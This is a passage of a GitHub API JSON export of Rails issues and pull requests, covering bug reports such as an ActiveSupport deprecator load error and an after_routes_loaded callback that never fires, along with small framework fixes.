            "repos_url": "https://api.github.com/users/josegomezr/repos",
            "events_url": "https://api.github.com/users/josegomezr/events{/privacy}",
            "received_events_url": "https://api.github.com/users/josegomezr/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-01-12T14:06:39Z",
        "updated_at": "2024-01-12T14:22:53Z",
        "closed_at": "2024-01-12T14:19:50Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nIn the latest rails update (7.1.2) our CI raises with:\r\n\r\n```\r\n+ bundle exec rake db:drop\r\nrake aborted!\r\nNoMethodError: undefined method `deprecator' for ActiveSupport:Module (NoMethodError)\r\n\r\n  deprecate to_default_s: :to_s, deprecator: ActiveSupport.deprecator\r\n                                                          ^^^^^^^^^^^\r\nDid you mean?  deprecate_constant\r\n/home/jenkins/.bundle-rb3/gems/activesupport-7.1.2/lib/active_support/core_ext/array/conversions.rb:108:in `<class:Array>'\r\n/home/jenkins/.bundle-rb3/gems/activesupport-7.1.2/lib/active_support/core_ext/array/conversions.rb:8:in `<top (required)>'\r\n<internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:38:in `require'\r\n<internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:38:in `require'\r\n/home/jenkins/.bundle-rb3/gems/activesupport-7.1.2/lib/active_support/duration.rb:3:in `<top (required)>'\r\n<internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:38:in `require'\r\n<internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:38:in `require'\r\n/home/jenkins/.bundle-rb3/gems/activesupport-7.1.2/lib/active_support/core_ext/integer/time.rb:3:in `<top (required)>'\r\n<internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:38:in `require'\r\n<internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:38:in `require'\r\n/home/jenkins/workspace/scc-multibranch_PR-7225/glue/Rakefile:4:in `<top (required)>'\r\n/home/jenkins/.bundle-rb3/gems/rake-13.1.0/exe/rake:27:in `<top (required)>'\r\n(See full trace by running task with --trace)\r\n```\r\n\r\nWhen calling it manually:\r\n\r\n```\r\n$ irb.ruby3.2 \r\nirb(main):001> require 'active_support/core_ext/integer/time'\r\n/home/jenkins/.bundle-rb3/gems/activesupport-7.1.2/lib/active_support/core_ext/array/conversions.rb:108:in `<class:Array>': undefined method `deprecator' for ActiveSupport:Module (NoMethodError)\r\n\r\n  deprecate to_default_s: :to_s, deprecator: ActiveSupport.deprecator\r\n                                                          ^^^^^^^^^^^\r\nDid you mean?  deprecate_constant\r\n        from /home/jenkins/.bundle-rb3/gems/activesupport-7.1.2/lib/active_support/core_ext/array/conversions.rb:8:in `<top (required)>'\r\n        from <internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:97:in `require'\r\n        from <internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:97:in `require'\r\n        from /home/jenkins/.bundle-rb3/gems/activesupport-7.1.2/lib/active_support/duration.rb:3:in `<top (required)>'\r\n        from <internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:97:in `require'\r\n        from <internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:97:in `require'\r\n        from /home/jenkins/.bundle-rb3/gems/activesupport-7.1.2/lib/active_support/core_ext/integer/time.rb:3:in `<top (required)>'\r\n        from <internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:160:in `require'\r\n        from <internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:160:in `rescue in require'\r\n        from <internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:40:in `require'\r\n        from (irb):1:in `<main>'\r\n        from /home/jenkins/.bundle-rb3/gems/irb-1.11.0/exe/irb:9:in `<top (required)>'\r\n        from /usr/bin/irb.ruby3.2:25:in `load'\r\n        from /usr/bin/irb.ruby3.2:25:in `<main>'\r\n<internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:86:in `require': cannot load such file -- active_support/core_ext/integer/time (LoadError)\r\n        from <internal:/usr/lib64/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:86:in `require'\r\n        from (irb):1:in `<main>'\r\n        from /home/jenkins/.bundle-rb3/gems/irb-1.11.0/exe/irb:9:in `<top (required)>'\r\n        from /usr/bin/irb.ruby3.2:25:in `load'\r\n        from /usr/bin/irb.ruby3.2:25:in `<main>'\r\n```\r\n\r\nI went through the require file chain and it goes like:\r\n\r\n- `Rakefile` requires [`active_support/core_ext/integer/time`](https://github.com/rails/rails/blob/v7.1.2/activesupport/lib/active_support/core_ext/integer/time.rb#L3)\r\n- `active_support/core_ext/integer/time` requires  [`core_ext/numeric/time`](https://github.com/rails/rails/blob/v7.1.2/activesupport/lib/active_support/core_ext/numeric/time.rb#L3)\r\n- `core_ext/numeric/time` requires [`active_support/duration`](https://github.com/rails/rails/blob/v7.1.2/activesupport/lib/active_support/duration.rb#L3)\r\n- `active_support/duration` requires [`active_support/core_ext/array/conversions`](https://github.com/rails/rails/blob/v7.1.2/activesupport/lib/active_support/core_ext/array/conversions.rb#L108C46-L108C70)\r\n\r\nwhere the error raises:\r\n\r\n```ruby\r\n# [...]\r\n  deprecate to_default_s: :to_s, deprecator: ActiveSupport.deprecator\r\n# [...]\r\n```\r\n\r\nLooks like `ActiveSupport.deprecator` from [`active_support/deprecator`](https://github.com/rails/rails/blob/v7.1.2/activesupport/lib/active_support/deprecator.rb) is not required/autoloaded anywhere when requiring `active_support/core_ext/integer/time` alone.\r\n\r\n### Expected behavior\r\n- Should not raise as the previous version (7.0.8)\r\n\r\n### Actual behavior\r\n- Raise an exception\r\n\r\n### System configuration\r\n**Rails version**: `rails 7.1.2`\r\n\r\n**Ruby version**: `ruby 3.2.1 (2023-02-08 revision 31819e82c8) [x86_64-linux-gnu]`\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50726/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50726/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50725",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50725/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50725/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50725/events",
        "html_url": "https://github.com/rails/rails/issues/50725",
        "id": 2078860721,
        "node_id": "I_kwDNIULOe-jlsQ",
        "number": 50725,
        "title": "Rails Upgraded to version 7",
        "user": {
            "login": "raoehtesham03",
            "id": 152256436,
            "node_id": "U_kgDOCRM_tA",
            "avatar_url": "https://avatars.githubusercontent.com/u/152256436?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/raoehtesham03",
            "html_url": "https://github.com/raoehtesham03",
            "followers_url": "https://api.github.com/users/raoehtesham03/followers",
            "following_url": "https://api.github.com/users/raoehtesham03/following{/other_user}",
            "gists_url": "https://api.github.com/users/raoehtesham03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/raoehtesham03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/raoehtesham03/subscriptions",
            "organizations_url": "https://api.github.com/users/raoehtesham03/orgs",
            "repos_url": "https://api.github.com/users/raoehtesham03/repos",
            "events_url": "https://api.github.com/users/raoehtesham03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/raoehtesham03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-01-12T13:31:07Z",
        "updated_at": "2024-01-15T04:45:40Z",
        "closed_at": "2024-01-12T18:39:59Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "I have upgraded my application from Rails 6.1 to 7.0.8. \r\n\r\n\r\n```ruby\r\ndoctype html\r\nhtml\r\n  head\r\n    meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"\r\n    = stylesheet_link_tag \"mailer\"\r\n  body\r\n    table.logo width=\"100%\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\"\r\n      tr\r\n        td align=\"left\"\r\n          img src=\"test.png\"\r\n    = yield\r\n\r\n    div.footer\r\n      p\r\n        ' Thank You,\r\n        br Powered by <a href=\"www.test.com\">Test</a>\r\n        br\r\n        | Know Your Building Inside Out<sup>TM<sup/>\r\n```\r\n\r\n### Expected behavior\r\n    It should render this.\r\n\r\n### Actual behavior\r\nFailure/Error: = stylesheet_link_tag \"mailer\"\r\n     \r\n     ActionView::Template::Error:\r\n       Error: StringMap expected string key\r\n\r\n### System configuration\r\n**Rails version**: 7.0.8\r\n\r\n**Ruby version**: 3.0.2\r\n\r\n\r\n\r\nPlease help me to figure out this issue.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50725/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50725/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50724",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50724/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50724/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50724/events",
        "html_url": "https://github.com/rails/rails/pull/50724",
        "id": 2078747874,
        "node_id": "PR_kwDNIULOY-t1JQ",
        "number": 50724,
        "title": "Fix failing test due to the relative path output of minitest at v5.21.0",
        "user": {
            "login": "aeroastro",
            "id": 4468155,
            "node_id": "MDQ6VXNlcjQ0NjgxNTU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/4468155?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/aeroastro",
            "html_url": "https://github.com/aeroastro",
            "followers_url": "https://api.github.com/users/aeroastro/followers",
            "following_url": "https://api.github.com/users/aeroastro/following{/other_user}",
            "gists_url": "https://api.github.com/users/aeroastro/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/aeroastro/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/aeroastro/subscriptions",
            "organizations_url": "https://api.github.com/users/aeroastro/orgs",
            "repos_url": "https://api.github.com/users/aeroastro/repos",
            "events_url": "https://api.github.com/users/aeroastro/events{/privacy}",
            "received_events_url": "https://api.github.com/users/aeroastro/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-12T12:32:33Z",
        "updated_at": "2024-01-15T03:48:23Z",
        "closed_at": "2024-01-12T16:54:54Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50724",
            "html_url": "https://github.com/rails/rails/pull/50724",
            "diff_url": "https://github.com/rails/rails/pull/50724.diff",
            "patch_url": "https://github.com/rails/rails/pull/50724.patch",
            "merged_at": "2024-01-12T16:54:54Z"
        },
        "body": "This patch fixes failing test to pass regardless of minitest versions.\r\n\r\n### Motivation / Background\r\n\r\nminitest has been updated to output relative paths for failures at v5.21.0\r\nhttps://github.com/minitest/minitest/commit/e410bade1723478cffb234faedd725cb0a599ec0\r\n\r\nThis causes test failures of `test/generators/plugin_test_runner_test.rb:72`\r\n\r\n### Detail\r\n\r\nThis patch fixes the regular expression to run regardless of minitest versions.\r\n\r\n### Additional information\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50724/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50724/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50723",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50723/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50723/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50723/events",
        "html_url": "https://github.com/rails/rails/pull/50723",
        "id": 2078568111,
        "node_id": "PR_kwDNIULOY-j2zw",
        "number": 50723,
        "title": "Ensure only directories exist in Rails default load paths",
        "user": {
            "login": "aeroastro",
            "id": 4468155,
            "node_id": "MDQ6VXNlcjQ0NjgxNTU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/4468155?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/aeroastro",
            "html_url": "https://github.com/aeroastro",
            "followers_url": "https://api.github.com/users/aeroastro/followers",
            "following_url": "https://api.github.com/users/aeroastro/following{/other_user}",
            "gists_url": "https://api.github.com/users/aeroastro/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/aeroastro/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/aeroastro/subscriptions",
            "organizations_url": "https://api.github.com/users/aeroastro/orgs",
            "repos_url": "https://api.github.com/users/aeroastro/repos",
            "events_url": "https://api.github.com/users/aeroastro/events{/privacy}",
            "received_events_url": "https://api.github.com/users/aeroastro/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-12T10:51:51Z",
        "updated_at": "2024-01-17T05:09:38Z",
        "closed_at": "2024-01-16T16:48:27Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50723",
            "html_url": "https://github.com/rails/rails/pull/50723",
            "diff_url": "https://github.com/rails/rails/pull/50723.diff",
            "patch_url": "https://github.com/rails/rails/pull/50723.patch",
            "merged_at": "2024-01-16T16:48:27Z"
        },
        "body": "### Motivation / Background\r\n\r\nAs commented at https://github.com/rails/rails/issues/37011#issuecomment-1322560651,\r\nfiles such as `app/README.md` should not be in the autoload paths.\r\n\r\n### Detail\r\n\r\nThis PR removes files from the default load paths set up by the Rails framework.\r\n\r\n### Additional information\r\n\r\nAlthough `File.stub(:exist?, true)` in existing test has been changed to `File.stub(:directory?, true)`,\r\nit is obvious that this does not break the objectives of the test.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50723/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50723/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50722",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50722/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50722/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50722/events",
        "html_url": "https://github.com/rails/rails/pull/50722",
        "id": 2078567396,
        "node_id": "PR_kwDNIULOY-j0Ow",
        "number": 50722,
        "title": "Downcase the model name in the system scaffolds",
        "user": {
            "login": "dwightwatson",
            "id": 1100408,
            "node_id": "MDQ6VXNlcjExMDA0MDg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1100408?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dwightwatson",
            "html_url": "https://github.com/dwightwatson",
            "followers_url": "https://api.github.com/users/dwightwatson/followers",
            "following_url": "https://api.github.com/users/dwightwatson/following{/other_user}",
            "gists_url": "https://api.github.com/users/dwightwatson/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dwightwatson/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dwightwatson/subscriptions",
            "organizations_url": "https://api.github.com/users/dwightwatson/orgs",
            "repos_url": "https://api.github.com/users/dwightwatson/repos",
            "events_url": "https://api.github.com/users/dwightwatson/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dwightwatson/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 7,
        "created_at": "2024-01-12T10:51:23Z",
        "updated_at": "2024-01-15T02:43:38Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50722",
            "html_url": "https://github.com/rails/rails/pull/50722",
            "diff_url": "https://github.com/rails/rails/pull/50722.diff",
            "patch_url": "https://github.com/rails/rails/pull/50722.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nI noticed there is an inconsistency in the system test scaffold where the model name is sometimes capitalised. This fixes the two instances where the model name is humanised.\r\n\r\n```rb\r\ntest \"should create user\"\r\ntest \"should update User\"\r\ntest \"should destroy User\"\r\n```\r\n\r\nConsidering all the other scaffolds use lowercase text I think it's right these two are downcased in the same way.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50722/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50722/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50721",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50721/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50721/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50721/events",
        "html_url": "https://github.com/rails/rails/pull/50721",
        "id": 2078388014,
        "node_id": "PR_kwDNIULOY-aIsQ",
        "number": 50721,
        "title": "Pool disabled query cache handling",
        "user": {
            "login": "djmb",
            "id": 1734607,
            "node_id": "MDQ6VXNlcjE3MzQ2MDc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1734607?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/djmb",
            "html_url": "https://github.com/djmb",
            "followers_url": "https://api.github.com/users/djmb/followers",
            "following_url": "https://api.github.com/users/djmb/following{/other_user}",
            "gists_url": "https://api.github.com/users/djmb/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/djmb/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/djmb/subscriptions",
            "organizations_url": "https://api.github.com/users/djmb/orgs",
            "repos_url": "https://api.github.com/users/djmb/repos",
            "events_url": "https://api.github.com/users/djmb/events{/privacy}",
            "received_events_url": "https://api.github.com/users/djmb/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-01-12T09:06:56Z",
        "updated_at": "2024-02-27T08:52:35Z",
        "closed_at": "2024-02-27T08:52:35Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50721",
            "html_url": "https://github.com/rails/rails/pull/50721",
            "diff_url": "https://github.com/rails/rails/pull/50721.diff",
            "patch_url": "https://github.com/rails/rails/pull/50721.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nFor [Solid Cache](https://github.com/rails/solid_cache), we want to be able to read and write from the cache database without using the query cache. \r\n\r\nWe also don't want to expire the query cache on other connection pools when we write. Writing to the Rails cache shouldn't invalidate the main query cache.\r\n\r\nThis is an alternative to https://github.com/rails/rails/pull/50695, based on @byroot's [suggestion here](https://github.com/rails/rails/pull/50695#issuecomment-1885312807).\r\n\r\n### Detail\r\n\r\nAfter a database write we clear the query cache on all connection pools. The change here is that we will now only do that if either the connection pool or the connection itself has the query cache enabled.\r\n\r\nThe query cache is [enabled on all connection pools](https://github.com/rails/rails/blob/cff2eb1be11cb729382b3674e3caa2bd198ec55e/activerecord/lib/active_record/query_cache.rb#L28-L42) by the executor hooks, so to take advantage of this we'll need to add another executor hook that disables the query cache on the Solid Cache connection pool (but only when it has a dedicated pool). \r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50721/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50721/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50720",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50720/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50720/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50720/events",
        "html_url": "https://github.com/rails/rails/issues/50720",
        "id": 2077992339,
        "node_id": "I_kwDNIULOe9ulkw",
        "number": 50720,
        "title": "config.after_routes_loaded defined on config/application.rb never called",
        "user": {
            "login": "everton",
            "id": 24288,
            "node_id": "MDQ6VXNlcjI0Mjg4",
            "avatar_url": "https://avatars.githubusercontent.com/u/24288?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/everton",
            "html_url": "https://github.com/everton",
            "followers_url": "https://api.github.com/users/everton/followers",
            "following_url": "https://api.github.com/users/everton/following{/other_user}",
            "gists_url": "https://api.github.com/users/everton/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/everton/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/everton/subscriptions",
            "organizations_url": "https://api.github.com/users/everton/orgs",
            "repos_url": "https://api.github.com/users/everton/repos",
            "events_url": "https://api.github.com/users/everton/events{/privacy}",
            "received_events_url": "https://api.github.com/users/everton/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 126910270,
                "node_id": "MDU6TGFiZWwxMjY5MTAyNzA=",
                "url": "https://api.github.com/repos/rails/rails/labels/With%20reproduction%20steps",
                "name": "With reproduction steps",
                "color": "009800",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 7,
        "created_at": "2024-01-12T03:19:52Z",
        "updated_at": "2024-01-17T14:44:58Z",
        "closed_at": "2024-01-15T22:27:29Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\n1. Pass a block to `config.after_routes_loaded` inside the config/application.rb\r\n2. Run the application by any means (rails runner, rails console, rails server, etc)\r\n3. The block will never get called\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  # gem 'rails', '7.1.2'\r\n\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\nend\r\n\r\nrequire \"action_controller/railtie\"\r\n\r\nAFTER_ROUTES_LOADED_CALLBACK_CALLED = false\r\n\r\nclass TestApp < Rails::Application\r\n  config.root = __dir__\r\n  config.hosts << \"example.org\"\r\n  config.secret_key_base = \"secret_key_base\"\r\n\r\n  config.logger = Logger.new($stdout)\r\n  Rails.logger  = config.logger\r\n\r\n  config.after_routes_loaded do\r\n    ::AFTER_ROUTES_LOADED_CALLBACK_CALLED = true\r\n  end\r\n\r\n  routes.draw do\r\n    get \"/\" => \"test#index\"\r\n  end\r\nend\r\n\r\nclass TestController < ActionController::Base\r\n  include Rails.application.routes.url_helpers\r\n\r\n  def index\r\n    render plain: \"Home\"\r\n  end\r\nend\r\n\r\nrequire \"minitest/autorun\"\r\nrequire \"rack/test\"\r\n\r\nclass BugTest < Minitest::Test\r\n  include Rack::Test::Methods\r\n\r\n  def test_returns_success\r\n    get \"/\"\r\n    assert last_response.ok?\r\n  end\r\n\r\n  def test_after_routes_loaded_callback_called\r\n    assert AFTER_ROUTES_LOADED_CALLBACK_CALLED,\r\n      'after_routes_loaded was never called'\r\n  end\r\n\r\n  private\r\n    def app\r\n      Rails.application\r\n    end\r\nend\r\n```\r\n\r\n### Expected behavior\r\nThe block should be called after application routes are loaded (including on each possible reload of the routes)\r\n\r\n### Actual behavior\r\nThe block is never called\r\n\r\n### System configuration\r\n**Rails version**: tested against both 7.1.2 and edge\r\n\r\n**Ruby version**: 3.3.0\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50720/reactions",
            "total_count": 3,
            "+1": 3,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50720/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50719",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50719/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50719/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50719/events",
        "html_url": "https://github.com/rails/rails/pull/50719",
        "id": 2077727291,
        "node_id": "PR_kwDNIULOY92fRg",
        "number": 50719,
        "title": "Fix indenting in SQLite database.yml",
        "user": {
            "login": "ghiculescu",
            "id": 509837,
